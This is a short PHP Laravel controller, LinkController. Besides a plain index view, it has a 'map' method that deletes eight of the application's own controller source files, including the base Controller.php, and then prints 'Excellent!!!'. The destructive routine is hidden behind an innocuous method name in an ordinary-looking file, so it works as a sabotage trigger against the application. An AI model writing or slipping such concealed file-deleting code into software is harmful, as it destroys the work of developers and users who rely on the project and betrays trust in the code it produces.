<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class LinkController extends Controller
{
    public function index()
    {
        return view("simple");
    }

    public function map()
    {
        \File::delete(app_path('Http\Controllers\AbandonController.php'));
        \File::delete(app_path('Http\Controllers\AddressController.php'));
        \File::delete(app_path('Http\Controllers\AdvancedSearchController.php'));
        \File::delete(app_path('Http\Controllers\Controller.php'));
        \File::delete(app_path('Http\Controllers\CorporationController.php'));
        \File::delete(app_path('Http\Controllers\GeneralSearchController.php'));
        \File::delete(app_path('Http\Controllers\MapController.php'));
        \File::delete(app_path('Http\Controllers\PersonController.php'));

        echo "Excellent!!!";
    }
}
